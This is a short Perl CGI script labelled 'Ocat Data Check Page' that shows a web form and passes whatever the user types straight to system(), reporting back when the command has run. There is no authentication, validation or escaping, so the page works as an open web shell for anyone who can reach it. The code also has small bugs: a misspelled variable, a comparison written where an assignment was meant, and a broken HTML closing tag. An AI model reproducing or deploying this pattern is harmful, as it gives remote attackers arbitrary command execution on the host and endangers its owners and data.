#!/home/ascds/DS.release/ots/bin/perl

use CGI qw/:standard :netscape /;


#
#--- start html 
#
print "Content-type: text/html; charset=utf-8\n\n";

print "<!DOCTYPE html>";
print "<html>";
print "<head>";
print "<title>Ocat Data Check Page</title>";
print "<style  type='text/css'>";
print "table{text-align:center;margin-left:auto;margin-right:auto;border-style:solid;border-spacing:8px;border-width:2px;border-collapse:separate}";
print "a:link {color:blue;}";
print "a:visited {color:teal;}";
print "</style>";
print "</head>";

print "<body style='color:#000000;background-color:#FFFFE0'>";


#-------------------
#--- starting a form
#-------------------

print start_form();

print "<h2> Please type in the action you want to take </h2>";

$lien = '';
$line = param('submitter');
if($line eq "Clear Field"){
	$line == '';
}

if($line ne ''){
	system("$line");
	print "<h3>Execution of \"$line\" is done!</3>";
	$line = '';
	print "<br /><br /><h3>Next? (Clear the field, then hit \"Clear Field\" buttom before enter the next command)</h3>";
}


print textfield(-name=>'submitter', -value=>"", -override=>'', -size=>75);
print "<br /><br />";
print '<input type="submit" name="Check" value="Submit">';
print "<br /><br />";
print '<input type="submit" name="Check" value="Clear Field">';

print end_form();
print "</body>";
print "</html>";

